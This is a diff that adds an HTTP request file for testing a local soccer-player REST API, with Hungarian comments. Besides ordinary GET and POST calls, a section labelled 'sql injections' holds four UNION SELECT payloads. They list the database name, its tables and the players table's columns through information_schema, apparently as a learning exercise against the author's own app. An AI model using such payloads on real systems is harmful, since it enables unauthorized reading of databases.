@@ -1,0 +1,30 @@
+
+### get all players
+get http://localhost:3000/players
+
+
+### get player by id
+get http://localhost:3000/players/6
+
+
+### sql injections
+### get users tábla információk
+get http://localhost:3000/player/2 UNION SELECT *, '' FROM players
+
+### get mi az adatbázis neve
+get http://localhost:3000/players/2  UNION SELECT database(), '','',''
+
+### get milyen táblák vannak
+get http://localhost:3000/players/222  UNION select table_name, '','','' from information_schema.tables where table_schema='soccer_player'
+
+### get milyen oszlopai vannak a players táblának
+get http://localhost:3000/players/222 UNION select column_name,'', '','' from information_schema.columns where table_name='players' and table_schema='soccer_player'
+
+### post player
+post http://localhost:3000/players
+Content-Type: application/json
+{
+    "focistaNev": "Ádám",
+    "posztId": 4,
+    "csapatId": 6
+  }
